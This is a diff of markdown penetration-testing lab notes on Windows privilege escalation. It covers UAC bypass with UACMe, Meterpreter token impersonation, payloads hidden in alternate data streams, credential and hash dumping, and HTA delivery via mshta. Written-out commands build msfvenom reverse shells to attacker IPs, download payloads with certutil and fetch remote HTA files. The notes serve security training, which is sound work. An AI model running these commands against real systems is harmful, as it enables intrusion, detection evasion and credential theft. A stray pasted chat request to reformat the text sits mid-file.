@@ -142,8 +142,6 @@ The  results for DavTest will have the following checks show in the output
 ### Cadaver
 
 Cadaver is a tool for WebDAV clients that lets us upload and download files from the WebDav directory. Also comes pre-installed on most penetration testing distributions like Kali and Parrot OS.
-
-General Syntax:
 ```
 cadaver <target_location>
 ```
@@ -712,7 +710,6 @@ Tools like _crackmapexec_ can be used to perform brute-force attacks on WinRM to
 nmap -sV -p5985,5986 target
 ```
 
-
 #### Crackmapexec
 
 The _crackmapexec_ tool can be used for cracking various protocols including winrm.
@@ -795,23 +792,562 @@ Kernel exploits on Windows usually target vulnerabilities in the Windows kernel 
 2. Downloading, compiling, and transferring kernel exploits to the target system.
 
 
-
-Tools & Environment
-
-**Windows-Exploit-Suggester** - This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.
-
-+ GitHub: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
-
 **Windows-Kernel-Exploits** - Collection of Windows Kernel exploits sorted by CVE.  
 + GitHub: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-
 
+---
+
+#### Metepreter `getsystem` command
+
+In a Meterpreter session, the `getsystem` command is used to elevate privileges on the compromised machine to the highest possible level—typically, the _SYSTEM_ account on Windows systems.  When you run the command, Meterpreter tries various built-in privilege escalation techniques to elevate privileges. Here are a couple of common methods it employs:
+- **Named Pipe Impersonation** - This technique leverages the ability to impersonate tokens from privileged processes. Windows services often use named pipes for inter-process communication, and in some cases, a low-privileged process can access pipes from a higher-privileged service. By hijacking these pipes and impersonating the tokens, `getsystem` can elevate the session to SYSTEM privileges. 
+- **Token Duplication**: This technique involves duplicating an access token associated with a process that already has SYSTEM privileges. If a process with these privileges is running, `getsystem` can try to copy its token and use it to escalate privileges.
+
+#### Metasploit Local Exploit Suggester
+
+Metasploit has a post exploitation module 'local_exploit_suggester'  that can look for vulnerabilities pertinent to a version of a windows/linux operating system. This is post exploitation as the module requires a meterpreter session of a compromised system:
+
+1. **Find/Use the module**: You can either search Metasploit for `suggester` or use the module  `post/multi/recon/local_exploit_suggester`.
+```
+search suggester
+
+use post/multi/recon/local_exploit_suggester
+```
+
+2. **Configure the module**: You need to specify the meterpreter session that you want to run the module on with the `SESSION` option. You can confirm sessions using the background sessions you have with the `sessions` command.
+```
+set SESSION 2
+```
+
+3. **Run the module**: This will enumerate the vulnerabilities and display any local metasploit modules that could be used for privilege escalation. 
+```
+run
+```
+
+**Note: Make sure to research the found exploits to confirm what the exploit does and if its applicable to the version of the operating system.**
 
 
+#### Manual Privilege Escalation
 
+**Windows-Exploit-Suggester** - This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins. <u>This repo has been archived and hasn't been actively maintained since July 2023</u>.
+
++ GitHub: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+
+1. **Export contents of `systeminfo` to a file**: The information from the `sysinfo` needs to be saved since there's hotfixes applied to the system where the suggester will use to find vulnerabilities for. Either copy-paste the output to a txt file or use a redirect to output it to a file
+```
+systeminfo > output.txt
+```
+
+2. **Download the Windows Exploit Suggester zip**:  You can find the URL to download the zip from the Github repo
+```
+curl -L https://github.com/AonCyberLabs/Windows-Exploit-Suggester/archive/refs/heads/master.zip -o suggester.zip
+```
+- The `-L` (or `--location`) option in `curl` tells it to follow redirects. When you make a request to a URL that responds with an HTTP redirect (3xx status code) curl by default does **not** follow the redirection to the new location. The `-L` option tells `curl` to automatically follow the redirection and retrieve the content from the final location. This is useful when downloading files from URLs that might redirect to a different download location.
+
+3. **Extract the zip download:** You can use powershell's built-in cmdlet  `Expand-Archive` to extract ZIP files:
+```
+Expand-Archive -Path .\original.zip -DestinationPath .\destination-folder
+```
+
+4. **Download the updated MS Vuln Database:** Run the suggester script with the `--update`' to pull the updated database. This should output an .xls file of the database like `2023-06-02-msb.xls` which is dated to the time the command was ran.
+```
+.\windows-exploit-suggester.py --update
+```
+5. **Run suggester**: You need to specify `--database` which is the MS vulnerability database xls file and `--systeminfo` which is set to the location of the txt file for the systeminfo command. The output will have the vulnerabilities most likely to work on the system at the top. Prioritize exploits that provide privilege escalation.
+```
+.\windows-exploit-suggester.py --database 2023-06-02-msb.xls --systeminfo win7.txt
+```
+
+### Windows Kernel Exploits
+Note: For Windows Kernel Exploits SecWiki's Github is recommended.
+https://github.com/SecWiki/windows-kernel-exploits/
+
+Can navigate to the Temp directory on the Windows system which should be on the root of the C:\  Drive
+
+```
+meterpreter> upload file.exe
+```
+
+From the session, run the exe exploit.
+
+### UAC
+
+User Account Control (UAC) is a Windows security feature that prevents unauthorized changes to the operating system by requiring administrator approval for elevated actions. Non-privileged users will be prompted to provide administrative credentials to perform the action, while privileged users willl be prompted with a Yes/No consent before continuing. Attacks can attempt to bypass UAC to execute malicious software with elevated privileges.
+##### Bypassing UAC
+
+<u>To bypass UAC, access to a user account within the local administrators group of the target system is required</u>. UAC prompts users to confirm or provide credentials before granting administrative privileges.
+
+UAC has integrity levels ranging from low to high, if the UAC protection level is set below "high," some programs can run with elevated privileges without prompting the user. So, for example, if we create a meterpreter payload with msfvenom payload and have it successfully uploaded/executed on the target with administrative privileges, we would then bypass UAC without the need for the consent prompt.
+
+There are various tools and methods to bypass UAC, but the choice of technique depends on the version of Windows and the UAC integrity level configured on the target system.
+#### UACMe
+
+UACMe is an open-source privilege escalation tool developed by @hfire0x, designed to bypass Windows User Account Control (UAC) and gain elevated privileges on Windows systems. It allows attackers to execute malicious payloads on a Windows target with administrative/elevated privileges by abusing the inbuilt Window AutoElevate tool. The UACMe GitHub repository includes various methods for bypassing UAC, applicable to multiple Windows versions from Windows 7 to Windows 10.  To use UACMe, you need to compile the source code in the 'Source' directory which contains C code.
+- GitHub: https://github.com/hfiref0x/UACME
+
+To make UCAMe work to bypass UAC we'll need the following: 
+- x86-32/x64 Windows 7/8/8.1/10/11 client (some methods however works on server version too).
+- Admin account with UAC set on default settings required.
+
+**Default UAC Description:**
+
+"Notify me only when apps try to make changes to my computer (default)"
+
+```
+- Notify you when programs try to install software or make changes to your computer
+    
+- Not notify you when you make changes to Windows settings
+    
+- Freeze other tasks until you respond
+```
+##### Bypassing UAC Steps with UACMe 
+1. Compile the UACMe akagi32/akagi64 source code to an executable.
+2. Gain initial access to a system to get a meterpreter session
+3. Upload the meterpreter payload and akagi executable to the target
+4. Run the payload with Akagi to bypass UAC and get elevated meterpreter session
+
+---
+1. <u>Gain Initial Access on the target</u>: Run an initial Nmap scan and try to exploit any service. We'll use the meterpreter session to view the initial privileges and upload the payload/akagi executables to the target.
+
+**Useful Meterpreter Commands/Tips:**
+- Get current user => `getuid`
+- Check the current user's privileges => `getprivs`
+- If you have a x86 meterpreter session, you can migrate to the explorer process which should give you that x64 session.
+```
+meterpreter> pgrep explorer
+2342
+meterpreter> migrate 2342
+```
+
+**Windows Commands:**
+- View users => `net user`
+- Check the local administrator group => `net localgroup administrators` | Make sure the current user you're using is in this group
+
+In the shell session, you'll receive an "`System error 5 has occured. Access is denied` " since we'd need to respond to the UAC consent prompt which can't be done through the shell unless you bypass UAC.
+
+---
+2. <u>Create the metepreter payload with msfvenom and start a listener with multi handler</u>: We're creating the msfvenom payload because the initial Meterpreter session may lack high privileges or is unstable. Running the payload with UACMe will elevate the meterpreter session's privileges, ensuring the new payload establishes a fully privileged and hopefully more stable session. 
+```
+msfvenom -p payload LHOST=atk_machine LPORT=l_port -f file_type > file_name
+```
+
+Example:
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.41.59 LPORT=2345 -f exe > backdoor.exe
+```
+
+Start another metasploit instance (`service postgresql start && msfconsole`) and use `multi/handler` to listen for the connection from the  payload.
+
+- **Use/configure the module**: Set the configured payload to the one set from msfvenom. Next, we'll also need to set the `LHOST`/`LPORT` to the same one specified in the payload:
+```
+msf6> use multi/handler
+
+msf6> set payload windows/meterpreter/reverse_tcp
+
+msf6> set LHOST 10.10.41.59
+
+msf6> set LPORT 2345
+```
+- **Run the module**: This will start the listener. When the payload is executed on the target it will connect back here.
+```
+msf6> run
+```
+
+---
+3. <u>Upload the executables to the target</u>: Use the initial meterpreter/shell session to upload the reverse shell payload and akagi executable. It's recommended to have a Temp directory on the root of the C: drive to upload the payload to, so navigate/create the directory on the target.
+
+```
+meterpreter> cd C:\\
+meterpreter> mkdir Temp
+meterpreter> cd Temp\\
+```
+
+- Use the `upload`command to push the backdoor executable to the target.
+```
+meterpreter> upload backdoor.exe
+```
+
+- Next, upload the Akagi executable to the target
+```
+meterpreter> upload UACME/Akagi64.exe
+```
+
+4. <u>Run Akagi with the payload </u>: If you try to just run the payload backdoor now, UAC will prevent the execution. We'll run akagi with the payload. UACMe uses an akagi32/akagi64 executable which you need to specify a `Key` which is the number of method to use and then a `Parameter` which is the path to the payload executable you want to execute.  Look into the 'Keys' section listed in the description of the Github repository. Method 23 is recommended on windows 10 systems but doublecheck to see which Keys were fixed/patched. The execution of the executable should bypass UAC. Try to locate methods that work for the target operating system and hasn't been listed as fixed.
+```
+akagi_exe [method_num] payload_location
+```
+
+Example:
+```
+.\Akagi64.exe 23 C:\Temp\backdoor.exe
+```
+
+This will run the payload bypassing UAC, you can check the listener to see the new meterpreter session being setup.
+
+You should be able to run `ps` on the new meterpreter session to view the services on the target system, you should be able to migrate to any of these services, particularly any services running `NT AUTHORITY\SYSTEM` which would then escalate your privileges. If you migrated to one of these services running NT AUTHORITY\SYSTEM, you should have the permission to  perform actions like dumping NTLM hashes using something like Kiwi. In Metasploit, `kiwi` is an extension of **Meterpreter** that provides credential extraction capabilities similar to Mimikatz. 
+
+- **Load the Kiwi extension**
+```
+meterpreter> load kiwi
+```
+- **Run the 'lsa_dump_sam' command**: The`lsa_dump_sam` is a command in the Kiwi extension (or Mimikatz) that extracts NTLM and LM password hashes for local users from the Security Account Manager (SAM) database. The hashes are pulled directly from memory, bypassing file locks. The hashes should be outputted, this will be the same if you did this with Mimikatz:
+```
+meterpreter> lsa_dump_sam
+```
+- **View the Hashes**: The hashes should also display after running the `lsa_dump_sam` command but can also run `hashdump` which would display the same hashes:
+```
+meterpreter> hashdump
+```
+
+
+---
+
+### Windows Access Tokens
+
+A Windows access token is a core element of the authentication process, identifying the security context of a process or thread and acting like a temporary key that grants access to system or network resources without requiring credentials for each access. 
+
+Access tokens are created and managed by both **LSASS (Local Security Authority Subsystem Service)** and **winlogon**, but each plays a distinct role. LSASS handles the overall security policy and creates tokens for security operations, including non-interactive logons and background processes. The **winlogon** generates access token for interactive logon when a user successfully authenticates. Winlogon handles the sign-in prompt when you login into the computer. These tokens contains the identity and privileges of the user account which are then attached to the **userinit.exe** process to ensure all child processes started by the user will inherit a copy of the same token. This allows the processes to run with the same privileges as the authenticated user.
+
+Access tokens essentially are used to restrict what users can/cannot execute. Windows access tokens are categorized by security levels, which determine their assigned privileges.
+- **Impersonate-level tokens** result from non-interactive logins typically through  system services or domain logons and allow impersonations only on the local system.
+- **Delegate-level tokens** come from interactive logins like traditional logins or RDP and pose a greater risk since they can impersonate tokens across multiple systems.
+
+The ability to impersonate access tokens for privilege escalation depends on the privileges of the compromised account and the available impersonation or delegation tokens. Key privileges required for a successful impersonation attack include:
+- **SeAssignPrimaryToken**: Allows user to impersonate tokens
+- **SeCreateToken**: Allows creation of arbitrary tokens with administrative privileges.
+- **SeImpersonatePrivilege**: Permits creating processes under another user's security context, often with administrative access. This privilege is especially important.
+#### Incognito
+
+The Incognito module, originally a standalone application, is now integrated into Meterpreter. It allows impersonation of user tokens after successful exploitation. This module can also display a list of tokens available for impersonation.
+
+1. <u>Initial Access:</u> Perform an nmap scan on the system and then try to exploit any services on an open port to get a meterpreter session.
+
+2. <u>Check Privileges</u>: Can confirm the current user with `getuid` and then check their privileges with `getprivs`. Make sure it has at least of one the three privileges:
+	- **SeAssignPrimaryToken**
+	- **SeCreateToken**
+	- **SeImpersonatePrivilege**
+
+3. <u>Load Incognito</u>: Load the incognito extension from the meterpreter session.
+```
+load incognito
+```
+
+4. <u>View Access Tokens</u>: Run `list_tokens` to view the available access tokens. Note any potential admin accounts
+```
+list_tokens -u
+```
+
+5. <u>Impersonate a Token</u>: Use `impersonate_token` for the actual impersonation, copy/paste the admin user within quotes.
+```
+impersonate_token "ATTACKDEFENSE\Administrator"
+```
+
+6. (**Optional) Rinse and Repeat**: If you successfully impersonated an administrator, you'll likely have more access tokens available like `NT AUTHORITY \ SYSTEM` which you could try to impersonate again.
+
+###### NOTE: You'll be in a situation where there's no delegation or impersonation access tokens available. In this case, you'll need a potato attack to generate a NT AUTHORITY \ SYSTEM access token to impersonate it.
 
 # Windows-File-System-Vulnerabilities
 
+### Alternate Data Streams (ADS)
+
+Alternate Data Streams (ADS) is a file attribute of the NTFS (New Technology File System) designed to provide compatibility with the MacOS HFS (Hierarchical File System). Every file on an NTFS-formatted drive contains two streams:
+
+- **Data stream**: The primary stream holding the actual content of the file.
+- **Resource stream**: A secondary stream used to store metadata, which can also contain additional hidden data.
+
+An ADS can hold executable code or other payloads within the resource stream of an otherwise legitimate file. Attackers use this feature to conceal malicious content, making it harder to detect with conventional signature-based antivirus tools and static scanners. This technique allows malicious payloads to remain hidden while appearing as benign files.
+
+#### Creating and Accessing Alternate Data Streams
+
+To store or access data in a resource stream, a colon (`:`) is used to specify the alternate stream within the file.
+
+```
+test.txt:secret.txt
+```
+
+This command opens the **`secret.txt`** file hidden within the **resource stream** of `test.txt`. The hidden stream will not be visible through normal file listings, adding another layer of stealth.
+
+#### Redirecting a Payload into a Resource Stream
+
+Attackers can redirect malicious executables or payloads into the resource stream of legitimate files to evade detection. The `type` command can transfer the contents of a payload into the resource stream of a file.
+
+```
+type payload.exe > windowslog.txt:winpeas.exe
+```
+
+To make the log file look legitimate, you could add content to the primary stream using Notepad:
+```
+notepad windowslog.txt
+```
+
+The hidden payload can then be executed directly from the resource stream:
+```
+start windowslog.txt:winpeas.exe
+```
+
+#### Using Symbolic Links with ADS
+
+Attackers can also use **symbolic links** to disguise or redirect access to the hidden payloads within resource streams. A symbolic link is a pointer that refers to a file or directory elsewhere, further obfuscating malicious activity.
+
+Example of creating a symbolic link within the `C:\Windows\System32` directory:
+
+```
+mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe
+```
+
+When the link, which is `wpdate.exe` here, is executed from the command line, it triggers the hidden payload:
+
+```
+wupdate
+```
+
 # Windows-Credential Dumping
+
+
+**Windows Password Hashes**
+
+Windows stores hashed passwords locally in the SAM (Security Accounts Manager) database. Hashing is the process of converting a piece of data using a hashing function/algorithm into another new value called a hash or hash value.  In the early 2000s the encryption process was revised so that the password string provided would be automatically hashed and stored to prevent keeping clear-text passwords. Authentication would be compared to the hashed password.
+
+The Local Security Authority (LSA) manages the verification process which is tied to the LSASS process. Older Windows versions (up to Server 2003) used two types of hashes: LM and NTLM. However, starting from Windows Vista, LM hashing was disabled, with NTLM becoming the default. Very unlikely to see LM hashing in the wild.
+
+**SAM Database**
+
+The SAM is a database file that's responsible for managing user accounts and passwords on Windows systems. Windows has a security feature which prevents the SAM database file from being copied while the operating system is running.
+
+With the SAM database file being locked by the Windows NT kernel,  attackers would typically utilize memory techniques/tools like Mimikatz to dump SAM hashes from the LSASS process.  Elevated/Administrative privileges are required to interact with the LSASS process.
+
+In modern versions of Windows, the database is encrypted with a syskey.
+
+**LM Hashing**
+
+LM (LanMan) was the default hashing algorithm used in Windows operating systems prior to NT4.0 but is considered weak today. It splits passwords into two seven-character chunks, converts them to uppercase, and hashes each with DES. LM hashing lacks salts, making it vulnerable to brute-force and rainbow table attacks, which can easily crack the passwords. LM Hashing is disabled from Windows Vista and onwards.
+
+```
+Password123 -> PASSWO + RD123 -> DES -> LM_HASH1+LM_HASH2
+```
+
+**NTLM Hashing**
+
+NTLM is a more secure authentication protocol used from Windows Vista onwards replacing LM hashing. When a user account is created, it encrypts the passwords using the MD4 hashing algorithms while disposing the original clear-text password.  NTLM offers improvements over LM, such as case sensitivity, not splitting the hash, and supporting symbols and Unicode characters, making it harder to crack.
+
+```
+!PassW0RD321@ -> MD4 -> NTLM hash
+```
+
+##### Windows Configuration Files  
+
+Windows can automate repetitive tasks, like mass installations, using the Unattended Windows Setup utility. This tool relies on configuration files that specify system settings and store credentials, including the Administrator password. If these files remain on a system after installation, they could expose credentials, allowing attackers to authenticate and access the system.
+
+**Unattended Windows Setup**  
+The Unattended Windows Setup utility uses the following configuration files that contain user account and system config information:
+- `C:\Windows\Panther\Unattend.xml`
+- `C:\Windows\Panther\Autounattend.xml`
+For security, any passwords within these files may be encoded in base64.
+
+### Search For Passwords in Windows Config Files / Unattended Installation
+
+Exploitation Steps:
+1. First gain initial access into the system with a meterpreter session
+2. Next, use the meterpreter session to find the unattended xml file
+3. Identify the password and decode it with a base64 utility.
+4. Authenticate with the target with PsExec
+
+##### Generate a meterpreter payload using MSFVenom
+
+MSFVenom is used for generating payloads for a reverse shell.
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.66.82 LPORT=4321 -f exe > payload.exe
+```
+- `-p` = Payload
+- `-LHOST`/`LPORT` = Attack machine's IP and port
+- `-f` = file type
+
+##### Host a website for the payload.exe
+
+We'd normally try to establish initial access by exploiting a service but we can run the built-in Python module `SimpleHTTPServer` to quickly launch an HTTP server to serve files from a directory containing the payload that can be downloaded to the target. Simply run it in the target directory, and it will host the contents over HTTP on the specified port.
+
+```
+python -m SimpleHTTPServer 80
+```
+
+You can use the `certutil` command on the windows system to download the payload.
+```
+certutil -urlcache -f http://<server_ip>/payload.exe payload.exe
+```
+
+Use could try to use meterpreter's in-built search to search for the type of files you're interested in.
+
+```
+search -f <file>.txt
+```
+
+Look for `<AutoLogon>` tag, this should have hard-coded credentials. We'd know any password is encoded if the `<PlainText>` tag is set to false.
+
+```
+<AutoLogon>
+	<Password>
+		<Value>QWRtaW5AMTIz</Value>
+		<PlainText>false</PlainText>
+	</Password>
+	<Enabled>true</Enabled>
+	<Username>administrator</Username>
+</AutoLogon>
+```
+
+Use kali's base64 decoder to extract the credentials. You can output using `-o` to a file if you'd like:
+
+```
+base64 -d password.txt 
+```
+
+The password could be used through something like PsExec
+#### Psexec Python Script
+
+Psexec is a windows executable which can't be ran on a Linux system. We can use the `psexec.py` which is a python implementation of the software. 
+
+```
+psexec.py Username@Target <cmd_to_execute_on_system>
+```
+Example: You can run psexec.py against the target and try to execute a shell using cmd.exe:
+```
+psexec.py Administrator@10.63.45.88 cmd.exe
+```
+
+
+### PowerSploit to find Unattended Installation files
+
+**PowerSploit** is a collection of Microsoft PowerShell modules designed to assist penetration testers during all phases of an assessment. One of these modules, **PowerUp.ps1**, focuses on identifying common Windows privilege escalation vectors that exploit misconfigurations. We will run the PowerUp.ps1 script to detect potential privilege escalation vulnerabilities on the system.
+- **Github**: https://github.com/PowerShellMafia/PowerSploit
+
+1. Navigate to the PowerUp Script:
+```
+..\PowerSploit\Privesc\
+```
+
+2. <u>Starts a new PowerShell session with the execution policy set to "bypass"</u>: Normally, PowerShell enforces an execution policy to prevent untrusted scripts from running (like "Restricted" or "RemoteSigned"). The `-ep bypass` flag tells PowerShell to ignore those restrictions just for this session, allowing any script to run freely.
+```
+powershell -ep bypass
+```
+
+3. <u>Import the PowerSploit PowerUp script</u>: Importing the PowerSploit script makes its functions and variables available for use. The dot-sourcing operator **(`.`)** makes sure the script runs in the **current session**, not a new one, allowing its contents to stay in memory and be directly accessible whenever needed throughout the session. Without dot-sourcing, the script would run in isolation, meaning functions like `Invoke-PrivescAudit` wouldn’t be available once the script finishes.
+```
+. .\PowerUp.ps1
+```
+
+4. <u>Run the PrivescAudit function</u>:  The `Invoke-PrivescAudit` function defined within the PowerUp.ps1 script that runs the privilege escalation audit, scanning for misconfigurations like vulnerable services or weak file permissions. Since the script was dot-sourced, this function is now available in the current PowerShell session.
+```
+Invoke-PrivescAudit
+```
+
+The output should find any vulnerabilities like a **Unattend.xml** file present on the system. Open the **Unattend.xml** file.
+```
+cat C:\Windows\Panther\Unattend.xml
+```
+
+ Decoding administrator password using Powershell.
+ 
+```
+$password='QWRtaW5AMTIz'
+$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa
+ssword))
+echo $password
+```
+
+
+We can leverage the administrative credentials to **escalate privileges and gain an elevated Meterpreter session**.
+
+
+
+This information was really helpful I would like to have the information to be reformatted and flow a bit better and not use bullets and have them in paragraph format and to not have it be "Reason: Explanation" like you did for certain topics like >
+"**Post-Exploitation Situations**: If you have already gained user-level access and need **privilege escalation**, this method can deliver the payload under elevated privileges (assuming the right user opens it)." I just want to entire explanation together. Also, I'm not really sure what embedded powershell means so can you an an explanation what that means especially when it comes to hta files when its relevant in the information:
+
+
+----
+##### mshta.exe and an HTA File to Gain a Meterpreter Session
+
+
+mshta.txt
+
+
+Using `mshta.exe` with an HTA file to gain a **Meterpreter session** is an exploitation method that leverages legitimate tools for access. Microsoft's HTML Application host aka `mshta.exe` is a Microsoft binary designed to execute HTML-based applications (HTA files). HTA files can run embedded PowerShell code, hidden within the file, which executes when the application runs and creates a **reverse shell** to the Meterpreter. Since `mshta.exe` is a legitimate component of the Windows operating system, this method demonstrates **Living off the Land (LotL)** tactics, where attackers rely on tools already installed on the target system to **evade detection** by antivirus (AV) or endpoint detection and response (EDR) solutions. Also, although PowerShell is often restricted by execution policies that block untrusted scripts, `mshta.exe` **bypasses these restrictions** by running the embedded PowerShell commands directly from the HTA file.
+
+
+Using the `hta_server` module in **Metasploit** to host and serve the HTA file allows the payload to be delivered **over the network**, eliminating the need to manually transfer files to the target system. This is particularly useful when direct file uploads are risky or monitored. The target machine only needs to **visit the malicious URL once** (e.g., `http://10.10.31.2:8080/Bn75U0NL8ONS.hta`) for the payload to be executed, providing a quick and efficient way to establish remote access. Once the embedded powershell commands of the **HTA payload** is executed and the Meterpreter session is established, the session runs **independently of the command prompt**. This makes the method ideal for one-time exploitation or scenarios where persistent access isn’t required.  The session will stay active as long as the connection between the target and attacker’s machine remains intact, but persistence mechanisms are required  (e.g., a scheduled task or registry key) if you want to maintain access through reboots or process restarts.
+
+In this lab, since the command prompt (`cmd.exe`) was **launched with administrator privileges** using the `runas.exe` command, any subsequent process—such as the HTA payload run with `mshta.exe`—inherits the same elevated privileges. This means that the resulting Meterpreter session will have **administrator-level access**, allowing for privileged operations such as disabling security tools, extracting passwords from memory, or modifying system configurations.
+
+Many endpoint security solutions don’t monitor or block `mshta.exe` as aggressively as custom executables. This makes it a highly effective way to deliver and execute malicious code without raising immediate suspicion. When file transfer to the target system is not feasible, **network-hosted delivery using the HTA server** ensures remote code execution without leaving obvious traces. This method teaches the importance of **chaining privilege escalation with remote code execution**, as it demonstrates how attackers can use legitimate tools to gain elevated access and maintain control over a system.
+
+
+
+
+
+
+
+
+**Step 7:** We can ran a command prompt as an administrator user using discover credentials.  The elevated cmd prompt can be used to 
+
+
+
+```
+runas.exe /user:administrator cmd
+```
+
+
+
+
+
+
+
+---
+
+
+
+
+
+**Step 8:** Running the **hta_server** module to gain the meterpreter shell. Start msfconsole.
+
+**Commands:**
+
+```
+msfconsole -q
+use exploit/windows/misc/hta_server
+exploit
+```
+
+“This module hosts an HTML Application (HTA) that when opened will run a payload via Powershell.”
+
+
+
+Copy the generated payload i.e **“http://10.10.31.2:8080/Bn75U0NL8ONS.hta”** and run it on cmd.exe with mshta command to gain the meterpreter shell.
+
+**Switch to Target Machine.**
+
+**Step 9:** Gaining a meterpreter shell.
+
+**Command:**
+
+```
+mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta
+```
+
+**Note:** You need to use your own metasploit HTA server link.
+
+We can expect a meterpreter shell.
+
+**Step 10:** Find the flag.
+
+**Commands:**
+
+```
+sessions -i 1
+cd /
+cd C:\\Users\\Administrator\\Desktop
+dir
+cat flag.txt
+```
+
+
 # Linux-Vulnerabilities
 
 # Exploiting-Linux-Vulnerabilities
